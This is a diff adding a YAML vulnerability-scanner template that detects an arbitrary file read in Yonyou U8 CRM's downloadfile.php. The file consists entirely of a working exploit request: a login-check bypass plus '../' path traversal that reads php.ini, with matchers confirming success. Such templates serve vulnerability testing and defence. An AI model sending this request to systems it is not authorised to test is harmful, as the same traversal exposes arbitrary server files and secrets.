@@ -1,0 +1,27 @@
+id: poc-yaml-yongyon-u8-crm-downloadfile-php-anyfile-read
+info:
+  name: 用友U8CRM downloadfile.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    用友U8CRM downloadfile.php 任意文件读取漏洞 allows arbitrary file reading via specific crafted requests.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "About php.ini"
+          - "About this file"
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
+          - "filename="
